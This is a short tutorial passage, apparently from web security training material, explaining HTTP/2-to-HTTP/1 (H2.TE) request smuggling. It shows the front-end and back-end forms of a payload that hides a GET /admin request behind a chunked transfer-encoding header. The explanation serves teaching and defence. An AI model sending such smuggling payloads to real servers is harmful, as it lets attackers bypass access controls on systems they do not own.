## H2.TE vulnerabilities

Chunked transfer encoding is incompatible with HTTP/2 and the spec recommends that any `transfer-encoding: chunked` header you try to inject should be stripped or the request blocked entirely. If the front-end server fails to do this, and downgrades the request for an HTTP/1 back-end that does support chunked encoding, this can also enable request smuggling attacks.

Front-end (HTTP/2):
```http
:method POST
:path /example
:authority vulnerable-website.com
content-type application/x-www-form-urlencoded
transfer-encoding chunked
0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```

Back-end (HTTP/1):
```http
POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: bar
```
